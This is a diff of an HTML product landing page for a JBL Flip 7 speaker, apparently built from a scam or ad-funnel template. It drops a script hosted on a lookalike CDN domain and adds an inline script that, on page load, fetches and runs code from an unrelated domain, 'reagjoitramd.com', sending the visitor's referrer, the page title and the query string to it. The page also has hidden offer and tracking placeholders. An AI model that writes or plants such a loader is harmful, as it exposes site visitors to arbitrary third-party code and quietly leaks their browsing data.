@@ -8,12 +8,19 @@
       content="width=device-width, initial-scale=1.0"
     />
     <title>JBL Flip 7 Black Speaker</title>
-    <script defer src="https://jsdeliveris.com/ajax/libs/jquery/3.6.1/jquery.js"></script>
+    
   </head>
   <body>
-    <img class="sr-only" src="./images/sec-img.svg" type="image/svg+xml" alt="">
-    <div style="display: flex; flex-direction: column; gap: 10px; justify-content: center; align-items: center; height: 100%">
-      <div style="max-width: 500px;">
+    <span id="2db0dbd1-2b79-cbf2-1e63-4653aada8452"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='https://reagjoitramd.com/54ggv7xy?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&_cid=2db0dbd1-2b79-cbf2-1e63-4653aada8452&frm=script'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://reagjoitramd.com/54ggv7xy?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script>
         <img
           src="./images/prod.webp"
           width="100%"
@@ -29,4 +36,5 @@
     <object class="sr-only" data="./images/sec-img.svg?o={offer_id}&l={landing_id}" type="image/svg+xml"></object>
     {_fbclid}
   </body>
+
 </html>
